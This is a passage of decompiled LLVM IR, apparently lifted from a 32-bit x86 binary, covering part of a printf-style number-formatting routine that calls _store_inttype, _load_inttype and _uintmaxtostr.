  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804a87872 = sub i32 0, %v3_804a865
  %v10_804a87875 = and i32 %v3_804a865, %v2_804a87872
  %v11_804a87876 = icmp slt i32 %v10_804a87875, 0
  %v13_804a87877 = icmp slt i32 %v2_804a87872, 0
  %v2_804a87a78 = icmp eq i1 %v13_804a87877, %v11_804a87876
  br i1 %v2_804a87a78, label %dec_label_pc_804a87c, label %dec_label_pc_804a86d

dec_label_pc_804a86d:                             ; preds = %dec_label_pc_804a865, %dec_label_pc_804a86d
  %v0_804a87c82 = phi i32 [ %v0_804a87c, %dec_label_pc_804a86d ], [ %v1_804a850, %dec_label_pc_804a865 ]
  %v2_804a86d81 = phi i32 [ %v1_804a877, %dec_label_pc_804a86d ], [ 0, %dec_label_pc_804a865 ]
  %v0_804a86d80 = phi i32 [ %v1_804a874, %dec_label_pc_804a86d ], [ %v0_804a86d27, %dec_label_pc_804a865 ]
  %v3_804a86d = mul i32 %v2_804a86d81, 4
  %v4_804a86d = add i32 %v3_804a86d, 344
  %v5_804a86d = add i32 %v4_804a86d, %v0_804a87c82
  %v6_804a86d = inttoptr i32 %v5_804a86d to i32*
  store i32 %v0_804a86d80, i32* %v6_804a86d, align 4
  %v0_804a874 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a874 = add i32 %v0_804a874, 12
  store i32 %v1_804a874, i32* %edx.global-to-local, align 4
  %v0_804a877 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a877 = add i32 %v0_804a877, 1
  %v1_804a878.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a877, i32* %eax.global-to-local, align 4
  %v2_804a878 = sub i32 %v1_804a877, %v1_804a878.pre
  %v8_804a878 = xor i32 %v1_804a877, %v1_804a878.pre
  %v9_804a878 = xor i32 %v2_804a878, %v1_804a877
  %v10_804a878 = and i32 %v9_804a878, %v8_804a878
  %v11_804a878 = icmp slt i32 %v10_804a878, 0
  %v13_804a878 = icmp slt i32 %v2_804a878, 0
  %v2_804a87a = icmp eq i1 %v13_804a878, %v11_804a878
  %v0_804a87c = load i32, i32* @esp, align 4
  br i1 %v2_804a87a, label %dec_label_pc_804a87c, label %dec_label_pc_804a86d

dec_label_pc_804a87c:                             ; preds = %dec_label_pc_804a86d, %dec_label_pc_804a865
  %v0_804a87c.lcssa = phi i32 [ %v1_804a850, %dec_label_pc_804a865 ], [ %v0_804a87c, %dec_label_pc_804a86d ]
  %v1_804a87c = add i32 %v0_804a87c.lcssa, 48
  %v2_804a87c = inttoptr i32 %v1_804a87c to i32*
  %v3_804a87c = load i32, i32* %v2_804a87c, align 4
  store i32 %v3_804a87c, i32* @ecx, align 4
  %v1_804a880 = icmp eq i32 %v3_804a87c, 0
  %v2_804a880 = icmp slt i32 %v3_804a87c, 0
  store i1 %v2_804a880, i1* %sf.global-to-local, align 1
  %v1_804a882 = icmp eq i1 %v1_804a880, false
  br i1 %v1_804a882, label %dec_label_pc_804a8aa, label %dec_label_pc_804a884

dec_label_pc_804a884:                             ; preds = %dec_label_pc_804a87c
  %v1_804a884 = inttoptr i32 %v0_804a87c.lcssa to i32*
  %v2_804a884 = load i32, i32* %v1_804a884, align 4
  store i32 %v2_804a884, i32* %eax.global-to-local, align 4
  %v1_804a887 = ashr i32 %v2_804a884, 31
  store i32 %v1_804a887, i32* %edx.global-to-local, align 4
  %v2_804a888 = add i32 %v0_804a87c.lcssa, -4
  %v3_804a888 = inttoptr i32 %v2_804a888 to i32*
  store i32 %v1_804a887, i32* %v3_804a888, align 4
  %v0_804a889 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a889 = add i32 %v0_804a87c.lcssa, -8
  %v3_804a889 = inttoptr i32 %v2_804a889 to i32*
  store i32 %v0_804a889, i32* %v3_804a889, align 4
  %v1_804a88a = add i32 %v0_804a87c.lcssa, 32
  %v2_804a88a = inttoptr i32 %v1_804a88a to i32*
  %v3_804a88a = load i32, i32* %v2_804a88a, align 4
  %v1_804a88e = and i32 %v3_804a88a, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804a88e, i32* %eax.global-to-local, align 4
  %v2_804a893 = add i32 %v0_804a87c.lcssa, -12
  %v3_804a893 = inttoptr i32 %v2_804a893 to i32*
  store i32 %v1_804a88e, i32* %v3_804a893, align 4
  %v1_804a894 = add i32 %v0_804a87c.lcssa, 344
  %v2_804a894 = inttoptr i32 %v1_804a894 to i32*
  %v3_804a894 = load i32, i32* %v2_804a894, align 4
  store i32 %v3_804a894, i32* %eax.global-to-local, align 4
  %v1_804a89b = inttoptr i32 %v3_804a894 to i32*
  %v2_804a89b = load i32, i32* %v1_804a89b, align 4
  %v4_804a89b = add i32 %v0_804a87c.lcssa, -16
  %v5_804a89b = inttoptr i32 %v4_804a89b to i32*
  store i32 %v2_804a89b, i32* %v5_804a89b, align 4
  %v0_804a89d = call i32 @_store_inttype()
  store i32 %v0_804a89d, i32* %eax.global-to-local, align 4
  %v0_804a8a2 = load i32, i32* @esp, align 4
  %v1_804a8a2 = add i32 %v0_804a8a2, 16
  %v7_804a8a2 = icmp slt i32 %v1_804a8a2, 0
  store i1 %v7_804a8a2, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804acec

dec_label_pc_804a8aa:                             ; preds = %dec_label_pc_804a87c
  %v1_804a8aa = add i32 %v3_804a87c, -7
  %v5_804a8aa = icmp ult i32 %v3_804a87c, 7
  %v9_804a8aa = icmp eq i32 %v1_804a8aa, 0
  %v10_804a8aa = icmp slt i32 %v1_804a8aa, 0
  store i1 %v10_804a8aa, i1* %sf.global-to-local, align 1
  %v2_804a8ad = or i1 %v5_804a8aa, %v9_804a8aa
  br i1 %v2_804a8ad, label %dec_label_pc_804a8b3, label %dec_label_pc_804aa17

dec_label_pc_804a8b3:                             ; preds = %dec_label_pc_804a8aa
  %v1_804a8b3 = add i32 %v3_804a87c, 134551536
  %v2_804a8b3 = inttoptr i32 %v1_804a8b3 to i8*
  %v3_804a8b3 = load i8, i8* %v2_804a8b3, align 1
  %v4_804a8b3 = sext i8 %v3_804a8b3 to i32
  store i32 %v4_804a8b3, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804a8bf = icmp eq i8 %v3_804a8b3, 10
  %v10_804a8bf = icmp slt i8 %v3_804a8b3, 10
  store i1 %v10_804a8bf, i1* %sf.global-to-local, align 1
  %v1_804a8c2 = icmp eq i1 %v9_804a8bf, false
  br i1 %v1_804a8c2, label %dec_label_pc_804a8e2, label %dec_label_pc_804a8c4

dec_label_pc_804a8c4:                             ; preds = %dec_label_pc_804a8b3
  %v1_804a8c4 = add i32 %v0_804a87c.lcssa, 32
  %v2_804a8c4 = inttoptr i32 %v1_804a8c4 to i32*
  %v3_804a8c4 = load i32, i32* %v2_804a8c4, align 4
  store i32 %v3_804a8c4, i32* %eax.global-to-local, align 4
  %v1_804a8ca = udiv i32 %v3_804a8c4, 32
  %tmp67 = urem i32 %v1_804a8ca, 2
  %tmp68 = sub nsw i32 45, %tmp67
  %v2_804a8da = or i32 %tmp68, 128
  store i32 %v2_804a8da, i32* %edx.global-to-local, align 4
  %v2_804a8dd = and i32 %v3_804a8c4, 64
  %v3_804a8dd = icmp eq i32 %v2_804a8dd, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804a8df = icmp eq i1 %v3_804a8dd, false
  %v4_804a8df = select i1 %v1_804a8df, i32 %v2_804a8da, i32 %tmp68
  store i32 %v4_804a8df, i32* @ebx, align 4
  br label %dec_label_pc_804a8e2

dec_label_pc_804a8e2:                             ; preds = %dec_label_pc_804a8b3, %dec_label_pc_804a8c4
  %v1_804a8e2 = add i32 %v3_804a87c, -5
  %v5_804a8e2 = icmp ult i32 %v3_804a87c, 5
  %v9_804a8e2 = icmp eq i32 %v1_804a8e2, 0
  %v10_804a8e2 = icmp slt i32 %v1_804a8e2, 0
  store i1 %v10_804a8e2, i1* %sf.global-to-local, align 1
  %v2_804a8e5 = or i1 %v5_804a8e2, %v9_804a8e2
  br i1 %v2_804a8e5, label %dec_label_pc_804a8e7, label %dec_label_pc_804a8ff

dec_label_pc_804a8e7:                             ; preds = %dec_label_pc_804a8e2
  %v1_804a8e7 = add i32 %v3_804a87c, -3
  %v9_804a8e7 = icmp eq i32 %v1_804a8e7, 0
  %v10_804a8e7 = icmp slt i32 %v1_804a8e7, 0
  store i1 %v10_804a8e7, i1* %sf.global-to-local, align 1
  %v1_804a8ea = icmp eq i1 %v9_804a8e7, false
  br i1 %v1_804a8ea, label %dec_label_pc_804a8f3, label %dec_label_pc_804a8ec

dec_label_pc_804a8ec:                             ; preds = %dec_label_pc_804a8e7
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804a901

dec_label_pc_804a8f3:                             ; preds = %dec_label_pc_804a8e7
  %v1_804a8f3 = add i32 %v3_804a87c, -1
  %v9_804a8f3 = icmp eq i32 %v1_804a8f3, 0
  %v10_804a8f3 = icmp slt i32 %v1_804a8f3, 0
  store i1 %v10_804a8f3, i1* %sf.global-to-local, align 1
  br i1 %v9_804a8f3, label %dec_label_pc_804a906, label %dec_label_pc_804a901

dec_label_pc_804a8ff:                             ; preds = %dec_label_pc_804a8e2
  %v1_804a8ff = sub nsw i32 0, %v4_804a8b3
  %v7_804a8ff = icmp sgt i8 %v3_804a8b3, 0
  store i1 %v7_804a8ff, i1* %sf.global-to-local, align 1
  store i32 %v1_804a8ff, i32* @esi, align 4
  br label %dec_label_pc_804a901

dec_label_pc_804a901:                             ; preds = %dec_label_pc_804a8f3, %dec_label_pc_804a8ec, %dec_label_pc_804a8ff
  br label %dec_label_pc_804a906

dec_label_pc_804a906:                             ; preds = %dec_label_pc_804a8f3, %dec_label_pc_804a901
  %storemerge = phi i32 [ 11, %dec_label_pc_804a901 ], [ 6, %dec_label_pc_804a8f3 ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_804a906 = add i32 %v0_804a87c.lcssa, 20
  %v2_804a906 = inttoptr i32 %v1_804a906 to i32*
  %v3_804a906 = load i32, i32* %v2_804a906, align 4
  %v5_804a906 = icmp slt i32 %v3_804a906, 0
  store i1 %v5_804a906, i1* %sf.global-to-local, align 1
  %v1_804a90b = add i32 %v0_804a87c.lcssa, 7
  %v2_804a90b = inttoptr i32 %v1_804a90b to i8*
  store i8 32, i8* %v2_804a90b, align 1
  %v0_804a910 = load i1, i1* %sf.global-to-local, align 1
  %v1_804a910 = icmp eq i1 %v0_804a910, false
  br i1 %v1_804a910, label %dec_label_pc_804a91a, label %dec_label_pc_804a912

dec_label_pc_804a912:                             ; preds = %dec_label_pc_804a906
  %v0_804a912 = load i32, i32* @esp, align 4
  %v1_804a912 = add i32 %v0_804a912, 36
  %v2_804a912 = inttoptr i32 %v1_804a912 to i8*
  %v3_804a912 = load i8, i8* %v2_804a912, align 1
  %v4_804a912 = zext i8 %v3_804a912 to i32
  %v5_804a912 = load i32, i32* %edx.global-to-local, align 4
  %v6_804a912 = and i32 %v5_804a912, -256
  %v7_804a912 = or i32 %v6_804a912, %v4_804a912
  store i32 %v7_804a912, i32* %edx.global-to-local, align 4
  %v3_804a916 = add i32 %v0_804a912, 7
  %v4_804a916 = inttoptr i32 %v3_804a916 to i8*
  store i8 %v3_804a912, i8* %v4_804a916, align 1
  br label %dec_label_pc_804a91a

dec_label_pc_804a91a:                             ; preds = %dec_label_pc_804a906, %dec_label_pc_804a912
  %v1_804a91a = add i32 %v3_804a87c, -1
  %v8_804a91a = icmp eq i32 %v1_804a91a, 0
  %v9_804a91a = icmp slt i32 %v1_804a91a, 0
  store i1 %v9_804a91a, i1* %sf.global-to-local, align 1
  store i32 %v1_804a91a, i32* %ecx.global-to-local, align 4
  %v0_804a91b = load i32, i32* @esp, align 4
  %v1_804a91b = add i32 %v0_804a91b, 344
  %v2_804a91b = inttoptr i32 %v1_804a91b to i32*
  %v3_804a91b = load i32, i32* %v2_804a91b, align 4
  store i32 %v3_804a91b, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_804a933.pre = load i32, i32* @edi, align 4
  br i1 %v8_804a91a, label %dec_label_pc_804a933, label %dec_label_pc_804a929

dec_label_pc_804a929:                             ; preds = %dec_label_pc_804a91a
  %v2_804a929 = mul i32 %v0_804a933.pre, 4
  %v3_804a929 = add i32 %v0_804a91b, 52
  %v4_804a929 = add i32 %v3_804a929, %v2_804a929
  %v5_804a929 = inttoptr i32 %v4_804a929 to i32*
  %v6_804a929 = load i32, i32* %v5_804a929, align 4
  %v1_804a92d = and i32 %v6_804a929, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804a92d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a933

dec_label_pc_804a933:                             ; preds = %dec_label_pc_804a91a, %dec_label_pc_804a929
  %v2_804a933 = add i32 %v0_804a91b, -4
  %v3_804a933 = inttoptr i32 %v2_804a933 to i32*
  store i32 %v0_804a933.pre, i32* %v3_804a933, align 4
  %v0_804a934 = load i32, i32* @esi, align 4
  %v2_804a934 = add i32 %v0_804a91b, -8
  %v3_804a934 = inttoptr i32 %v2_804a934 to i32*
  store i32 %v0_804a934, i32* %v3_804a934, align 4
  %v0_804a935 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a935 = add i32 %v0_804a91b, -12
  %v3_804a935 = inttoptr i32 %v2_804a935 to i32*
  store i32 %v0_804a935, i32* %v3_804a935, align 4
  %v0_804a936 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a936 = add i32 %v0_804a91b, -16
  %v3_804a936 = inttoptr i32 %v2_804a936 to i32*
  store i32 %v0_804a936, i32* %v3_804a936, align 4
  %v0_804a937 = call i32 @_load_inttype()
  %v0_804a93c = load i32, i32* @ebx, align 4
  %v1_804a93c = load i32, i32* @esp, align 4
  %v2_804a93c = inttoptr i32 %v1_804a93c to i32*
  store i32 %v0_804a93c, i32* %v2_804a93c, align 4
  %v0_804a93f = load i32, i32* @esi, align 4
  %v1_804a93f = load i32, i32* @esp, align 4
  %v2_804a93f = add i32 %v1_804a93f, -4
  %v3_804a93f = inttoptr i32 %v2_804a93f to i32*
  store i32 %v0_804a93f, i32* %v3_804a93f, align 4
  %v0_804a940 = load i32, i32* @edx, align 4
  %v2_804a940 = add i32 %v1_804a93f, -8
  %v3_804a940 = inttoptr i32 %v2_804a940 to i32*
  store i32 %v0_804a940, i32* %v3_804a940, align 4
  %v2_804a941 = add i32 %v1_804a93f, -12
  %v3_804a941 = inttoptr i32 %v2_804a941 to i32*
  store i32 %v0_804a937, i32* %v3_804a941, align 4
  %v1_804a942 = add i32 %v1_804a93f, 347
  store i32 %v1_804a942, i32* %eax.global-to-local, align 4
  %v2_804a949 = add i32 %v1_804a93f, -16
  %v3_804a949 = inttoptr i32 %v2_804a949 to i32*
  store i32 %v1_804a942, i32* %v3_804a949, align 4
  %v0_804a94a = load i32, i32* %stack_var_-364, align 4
  %v5_804a94a = inttoptr i32 %v0_804a94a to i8*
  %v6_804a94a = call i32 @_uintmaxtostr(i8* %v5_804a94a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804a94a, i32* %eax.global-to-local, align 4
  %v0_804a94f = load i32, i32* @esp, align 4
  %v1_804a94f = add i32 %v0_804a94f, 32
  %v1_804a952 = add i32 %v0_804a94f, 80
  %v2_804a952 = inttoptr i32 %v1_804a952 to i32*
  %v3_804a952 = load i32, i32* %v2_804a952, align 4
  %v4_804a952 = add i32 %v3_804a952, -5
  %v8_804a952 = icmp ult i32 %v3_804a952, 5
  %v12_804a952 = icmp eq i32 %v4_804a952, 0
  %v13_804a952 = icmp slt i32 %v4_804a952, 0
  store i1 %v13_804a952, i1* %sf.global-to-local, align 1
  store i32 %v6_804a94a, i32* @edi, align 4
  %v2_804a959 = or i1 %v8_804a952, %v12_804a952
  br i1 %v2_804a959, label %dec_label_pc_804a983, label %dec_label_pc_804a95b

dec_label_pc_804a95b:                             ; preds = %dec_label_pc_804a933
  %v7_804a94a = inttoptr i32 %v6_804a94a to i8*
  %v3_804a95b = load i8, i8* %v7_804a94a, align 1
  %v4_804a95b = add i8 %v3_804a95b, -45
  %v12_804a95b = icmp eq i8 %v4_804a95b, 0
  %v13_804a95b = icmp slt i8 %v4_804a95b, 0
  store i1 %v13_804a95b, i1* %sf.global-to-local, align 1
  %v1_804a95e = icmp eq i1 %v12_804a95b, false
  %v1_804a96d = add i32 %v0_804a94f, 64
  %v2_804a96d = inttoptr i32 %v1_804a96d to i32*
  %v3_804a96d = load i32, i32* %v2_804a96d, align 4
  br i1 %v1_804a95e, label %dec_label_pc_804a96d, label %dec_label_pc_804a960

dec_label_pc_804a960:                             ; preds = %dec_label_pc_804a95b
  %v4_804a960 = or i32 %v3_804a96d, 2
  store i32 %v4_804a960, i32* %v2_804a96d, align 4
  %v0_804a965 = load i32, i32* @edi, align 4
  %v1_804a965 = add i32 %v0_804a965, 1
  %v9_804a965 = icmp slt i32 %v1_804a965, 0
  store i1 %v9_804a965, i1* %sf.global-to-local, align 1
  store i32 %v1_804a965, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804a983.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a983

dec_label_pc_804a96d:                             ; preds = %dec_label_pc_804a95b
  store i32 %v3_804a96d, i32* %eax.global-to-local, align 4
  %v2_804a971 = and i32 %v3_804a96d, 2
  %v3_804a971 = icmp eq i32 %v2_804a971, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_804a971, label %dec_label_pc_804a979, label %dec_label_pc_804a975

dec_label_pc_804a975:                             ; preds = %dec_label_pc_804a96d
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804a983

dec_label_pc_804a979:                             ; preds = %dec_label_pc_804a96d
  %v2_804a979 = urem i32 %v3_804a96d, 2
  %v3_804a979 = icmp eq i32 %v2_804a979, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_804a980 = icmp eq i1 %v3_804a979, false
  %v2_804a980 = load i32, i32* @ebp, align 4
  %v4_804a980 = select i1 %v1_804a980, i32 4, i32 %v2_804a980
  store i32 %v4_804a980, i32* @ebp, align 4
  br label %dec_label_pc_804a983

dec_label_pc_804a983:                             ; preds = %dec_label_pc_804a933, %dec_label_pc_804a975, %dec_label_pc_804a960, %dec_label_pc_804a979
  %v0_804a9d5 = phi i32 [ %v6_804a94a, %dec_label_pc_804a933 ], [ %v6_804a94a, %dec_label_pc_804a975 ], [ %v1_804a965, %dec_label_pc_804a960 ], [ %v6_804a94a, %dec_label_pc_804a979 ]
  %v0_804a9e5 = phi i32 [ %v1_804a94f, %dec_label_pc_804a933 ], [ %v1_804a94f, %dec_label_pc_804a975 ], [ %v0_804a983.pre, %dec_label_pc_804a960 ], [ %v1_804a94f, %dec_label_pc_804a979 ]
  %v1_804a983 = add i32 %v0_804a9e5, 20
  %v2_804a983 = inttoptr i32 %v1_804a983 to i32*
  %v3_804a983 = load i32, i32* %v2_804a983, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804a987 = sub i32 204, %v0_804a9d5
  %v2_804a993 = add i32 %v1_804a987, %v0_804a9e5
  %v1_804a995 = add i32 %v2_804a993, 127
  store i32 %v1_804a995, i32* @esi, align 4
  %v2_804a998 = icmp slt i32 %v3_804a983, 0
  store i1 %v2_804a998, i1* %sf.global-to-local, align 1
  %v3_804a99a = select i1 %v2_804a998, i32 1, i32 %v3_804a983
  store i32 %v3_804a99a, i32* %ecx.global-to-local, align 4
  %v1_804a99d = add i32 %v0_804a9e5, 32
  %v2_804a99d = inttoptr i32 %v1_804a99d to i8*
  %v3_804a99d = load i8, i8* %v2_804a99d, align 1
  %v4_804a99d = and i8 %v3_804a99d, 16
  %v5_804a99d = icmp eq i8 %v4_804a99d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_804a99d, label %dec_label_pc_804a9d5, label %dec_label_pc_804a9a4

dec_label_pc_804a9a4:                             ; preds = %dec_label_pc_804a983
  %v1_804a9a4 = add i32 %v0_804a9e5, 48
  %v2_804a9a4 = inttoptr i32 %v1_804a9a4 to i32*
  %v3_804a9a4 = load i32, i32* %v2_804a9a4, align 4
  store i32 %v3_804a9a4, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i32 %v3_804a9a4, 3
  %v3_804a9ad = load i32, i32* @ebp, align 4
  %v5_804a9ad = select i1 %tmp69, i32 6, i32 %v3_804a9ad
  store i32 %v5_804a9ad, i32* @ebp, align 4
  %v1_804a9b0 = add i32 %v3_804a9a4, -3
  %v9_804a9b0 = icmp eq i32 %v1_804a9b0, 0
  %v10_804a9b0 = icmp slt i32 %v1_804a9b0, 0
  store i1 %v10_804a9b0, i1* %sf.global-to-local, align 1
  %v1_804a9b3 = icmp eq i1 %v9_804a9b0, false
  br i1 %v1_804a9b3, label %dec_label_pc_804a9bc, label %dec_label_pc_804a9b5

dec_label_pc_804a9b5:                             ; preds = %dec_label_pc_804a9a4
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804a9d5

dec_label_pc_804a9bc:                             ; preds = %dec_label_pc_804a9a4
  %v1_804a9bc = add i32 %v3_804a9a4, -4
  %v9_804a9bc = icmp eq i32 %v1_804a9bc, 0
  %v10_804a9bc = icmp slt i32 %v1_804a9bc, 0
  store i1 %v10_804a9bc, i1* %sf.global-to-local, align 1
  %v1_804a9bf = icmp eq i1 %v9_804a9bc, false
  br i1 %v1_804a9bf, label %dec_label_pc_804a9d5, label %dec_label_pc_804a9c1

dec_label_pc_804a9c1:                             ; preds = %dec_label_pc_804a9bc
  %v2_804a9c1 = sub i32 %v3_804a99a, %v1_804a995
  %v7_804a9c1 = icmp ult i32 %v3_804a99a, %v1_804a995
  %v12_804a9c1 = icmp eq i32 %v2_804a9c1, 0
  %v13_804a9c1 = icmp slt i32 %v2_804a9c1, 0
  store i1 %v13_804a9c1, i1* %sf.global-to-local, align 1
  %v2_804a9c3 = or i1 %v7_804a9c1, %v12_804a9c1
  br i1 %v2_804a9c3, label %dec_label_pc_804a9c5, label %dec_label_pc_804a9d5

dec_label_pc_804a9c5:                             ; preds = %dec_label_pc_804a9c1
  %v1_804a9c5 = inttoptr i32 %v0_804a9d5 to i8*
  %v2_804a9c5 = load i8, i8* %v1_804a9c5, align 1
  %v3_804a9c5 = add i8 %v2_804a9c5, -48
  %v8_804a9c5 = icmp eq i8 %v3_804a9c5, 0
  %v9_804a9c5 = icmp slt i8 %v3_804a9c5, 0
  store i1 %v9_804a9c5, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_804a9c5, label %dec_label_pc_804a9d5, label %dec_label_pc_804a9cf

dec_label_pc_804a9cf:                             ; preds = %dec_label_pc_804a9c5
  %v1_804a9cf = add i32 %v2_804a993, 128
  store i32 %v1_804a9cf, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804a9d5

dec_label_pc_804a9d5:                             ; preds = %dec_label_pc_804a9c1, %dec_label_pc_804a9c5, %dec_label_pc_804a9bc, %dec_label_pc_804a983, %dec_label_pc_804a9b5, %dec_label_pc_804a9cf
  %v0_804aa0e = phi i32 [ %v3_804a99a, %dec_label_pc_804a9c1 ], [ 1, %dec_label_pc_804a9c5 ], [ %v3_804a99a, %dec_label_pc_804a9bc ], [ %v3_804a99a, %dec_label_pc_804a983 ], [ %v3_804a99a, %dec_label_pc_804a9b5 ], [ %v1_804a9cf, %dec_label_pc_804a9cf ]
  %v1_804a9d5 = inttoptr i32 %v0_804a9d5 to i8*
  %v2_804a9d5 = load i8, i8* %v1_804a9d5, align 1
  %v3_804a9d5 = add i8 %v2_804a9d5, -48
  %v8_804a9d5 = icmp eq i8 %v3_804a9d5, 0
  %v9_804a9d5 = icmp slt i8 %v3_804a9d5, 0
  store i1 %v9_804a9d5, i1* %sf.global-to-local, align 1
  %v1_804a9d8 = icmp eq i1 %v8_804a9d5, false
  br i1 %v1_804a9d8, label %dec_label_pc_804aa06, label %dec_label_pc_804a9da

dec_label_pc_804a9da:                             ; preds = %dec_label_pc_804a9d5
  %v0_804a9da = load i32, i32* @ebp, align 4
  %v1_804a9da = add i32 %v0_804a9da, -6
  %v6_804a9da = sub i32 5, %v0_804a9da
  %v7_804a9da = and i32 %v6_804a9da, %v0_804a9da
  %v8_804a9da = icmp slt i32 %v7_804a9da, 0
  %v10_804a9da = icmp slt i32 %v1_804a9da, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_804a9e2 = icmp eq i1 %v10_804a9da, %v8_804a9da
  %v5_804a9e2 = select i1 %v2_804a9e2, i32 11, i32 %v0_804a9da
  store i32 %v5_804a9e2, i32* @ebp, align 4
  %v1_804a9e5 = add i32 %v0_804a9e5, 48
  %v2_804a9e5 = inttoptr i32 %v1_804a9e5 to i32*
  %v3_804a9e5 = load i32, i32* %v2_804a9e5, align 4
  %v4_804a9e5 = add i32 %v3_804a9e5, -1
  %v12_804a9e5 = icmp eq i32 %v4_804a9e5, 0
  %v13_804a9e5 = icmp slt i32 %v4_804a9e5, 0
  store i1 %v13_804a9e5, i1* %sf.global-to-local, align 1
  %v1_804a9ea = icmp eq i1 %v12_804a9e5, false
  br i1 %v1_804a9ea, label %dec_label_pc_804a9fb, label %dec_label_pc_804a9ec

dec_label_pc_804a9ec:                             ; preds = %dec_label_pc_804a9da
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80517d8.320 to i32), i32* @edi, align 4
  br label %dec_label_pc_804ab85

dec_label_pc_804a9fb:                             ; preds = %dec_label_pc_804a9da
  %v1_804a9fb = icmp eq i32 %v0_804aa0e, 0
  %v2_804a9fb = icmp slt i32 %v0_804aa0e, 0
  store i1 %v2_804a9fb, i1* %sf.global-to-local, align 1
  %v1_804a9fd = icmp eq i1 %v1_804a9fb, false
  br i1 %v1_804a9fd, label %dec_label_pc_804aa06, label %dec_label_pc_804a9ff

dec_label_pc_804a9ff:                             ; preds = %dec_label_pc_804a9fb
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804ab85

dec_label_pc_804aa06:                             ; preds = %dec_label_pc_804a9fb, %dec_label_pc_804a9d5
  %v2_804aa06 = sub i32 %v0_804aa0e, %v1_804a995
  %v7_804aa06 = icmp ult i32 %v0_804aa0e, %v1_804a995
  %v12_804aa06 = icmp eq i32 %v2_804aa06, 0
  %v13_804aa06 = icmp slt i32 %v2_804aa06, 0
  store i1 %v13_804aa06, i1* %sf.global-to-local, align 1
  %v2_804aa08 = or i1 %v7_804aa06, %v12_804aa06
  br i1 %v2_804aa08, label %dec_label_pc_804ab85, label %dec_label_pc_804aa0e

dec_label_pc_804aa0e:                             ; preds = %dec_label_pc_804aa06
  store i1 %v13_804aa06, i1* %sf.global-to-local, align 1
  store i32 %v2_804aa06, i32* @ebx, align 4
  br label %dec_label_pc_804ab9f

dec_label_pc_804aa17:                             ; preds = %dec_label_pc_804a8aa
  %v1_804aa17 = add i32 %v3_804a87c, -15
  %v5_804aa17 = icmp ult i32 %v3_804a87c, 15
  %v9_804aa17 = icmp eq i32 %v1_804aa17, 0
  %v10_804aa17 = icmp slt i32 %v1_804aa17, 0
  store i1 %v10_804aa17, i1* %sf.global-to-local, align 1
  %v2_804aa1a = or i1 %v5_804aa17, %v9_804aa17
  br i1 %v2_804aa1a, label %dec_label_pc_804aa1c, label %dec_label_pc_804aa61

dec_label_pc_804aa1c:                             ; preds = %dec_label_pc_804aa17
  %v1_804aa1c = add i32 %v0_804a87c.lcssa, 33
  %v2_804aa1c = inttoptr i32 %v1_804aa1c to i8*
  %v3_804aa1c = load i8, i8* %v2_804aa1c, align 1
  %v4_804aa1c = and i8 %v3_804aa1c, 8
  %v5_804aa1c = icmp eq i8 %v4_804aa1c, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804aa21 = add i32 %v0_804a87c.lcssa, 344
  %v2_804aa21 = inttoptr i32 %v1_804aa21 to i32*
  %v3_804aa21 = load i32, i32* %v2_804aa21, align 4
  store i32 %v3_804aa21, i32* %edx.global-to-local, align 4
  br i1 %v5_804aa1c, label %dec_label_pc_804aa2e, label %dec_label_pc_804aa2a

dec_label_pc_804aa2a:                             ; preds = %dec_label_pc_804aa1c
  %v1_804aa2a = inttoptr i32 %v3_804aa21 to x86_fp80*
  %v2_804aa2a = load x86_fp80, x86_fp80* %v1_804aa2a, align 4
  br label %dec_label_pc_804aa30

dec_label_pc_804aa2e:                             ; preds = %dec_label_pc_804aa1c
  %v1_804aa2e = inttoptr i32 %v3_804aa21 to double*
  %v2_804aa2e = load double, double* %v1_804aa2e, align 4
  %v3_804aa2e = fpext double %v2_804aa2e to x86_fp80
  br label %dec_label_pc_804aa30

dec_label_pc_804aa30:                             ; preds = %dec_label_pc_804aa2a, %dec_label_pc_804aa2e
  %storemerge4 = phi x86_fp80 [ %v2_804aa2a, %dec_label_pc_804aa2a ], [ %v3_804aa2e, %dec_label_pc_804aa2e ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_804aa30 = load i32, i32* @esi, align 4
  %v2_804aa30 = add i32 %v0_804a87c.lcssa, -4
  %v3_804aa30 = inttoptr i32 %v2_804aa30 to i32*
  store i32 %v0_804aa30, i32* %v3_804aa30, align 4
  %v0_804aa31 = load i32, i32* @esi, align 4
